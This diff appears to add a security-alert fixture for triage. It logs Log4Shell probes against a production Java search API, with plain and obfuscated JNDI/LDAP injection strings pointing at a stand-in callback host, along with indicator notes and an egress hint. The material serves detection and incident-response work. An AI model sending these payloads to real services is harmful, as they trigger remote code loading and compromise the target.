@@ -1,0 +1,62 @@
+{
+  "alert_id": "ALERT-20260620-LOG4J-001",
+  "time_window": {
+    "start": "2026-06-20T10:40:00Z",
+    "end": "2026-06-20T10:48:00Z"
+  },
+  "asset": {
+    "host": "app-prod-17",
+    "service": "customer-search-api",
+    "component_hint": "Java web service with historical Log4j dependency"
+  },
+  "events": [
+    {
+      "timestamp": "2026-06-20T10:42:51Z",
+      "source_ip": "203.0.113.45",
+      "path": "/api/search",
+      "status": 200,
+      "user_agent": "Mozilla/5.0",
+      "query": "q=test"
+    },
+    {
+      "timestamp": "2026-06-20T10:43:19Z",
+      "source_ip": "203.0.113.45",
+      "path": "/api/search",
+      "status": 500,
+      "user_agent": "${jndi:ldap://198.51.100.25:1389/a}",
+      "query": "q=invoice"
+    },
+    {
+      "timestamp": "2026-06-20T10:43:21Z",
+      "source_ip": "203.0.113.45",
+      "path": "/api/search",
+      "status": 500,
+      "user_agent": "Mozilla/5.0",
+      "query": "q=${jndi:ldap://198.51.100.25:1389/b}"
+    },
+    {
+      "timestamp": "2026-06-20T10:44:02Z",
+      "source_ip": "203.0.113.45",
+      "path": "/api/search",
+      "status": 500,
+      "user_agent": "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://198.51.100.25:1389/c}",
+      "query": "q=profile"
+    }
+  ],
+  "local_ioc_notes": [
+    {
+      "indicator": "198.51.100.25:1389",
+      "tags": ["ldap-callback", "log4shell-probe", "CVE-2021-44228"]
+    },
+    {
+      "indicator": "${jndi:",
+      "tags": ["jndi-injection", "log4shell"]
+    }
+  ],
+  "egress_hint": {
+    "host": "app-prod-17",
+    "candidate_destination": "198.51.100.25",
+    "candidate_port": 1389,
+    "note": "需要通过受控 egress_lookup 查询本地出口日志确认。"
+  }
+}
